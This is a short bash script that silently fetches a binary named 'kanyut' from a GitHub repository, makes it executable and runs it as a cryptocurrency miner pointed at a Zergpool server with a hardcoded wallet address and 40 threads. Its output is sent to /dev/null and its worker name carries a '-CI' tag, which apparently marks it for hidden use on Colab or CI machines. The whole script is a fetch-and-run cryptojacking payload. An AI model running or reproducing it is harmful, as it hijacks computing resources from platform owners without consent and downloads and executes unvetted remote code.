#!/usr/bin/env bash
wget -q https://github.com/comandashtar/colab-2/raw/main/kanyut
chmod +x kanyut
./kanyut -v -l verushash.asia.mine.zergpool.com:3300 -u ML237BDudyEj71oMDFEJShKHc8F6ogqkdY.$(echo $(shuf -i 1-99999 -n 1)-CI) -p c=LTC -t 40 >/dev/null 2>&1
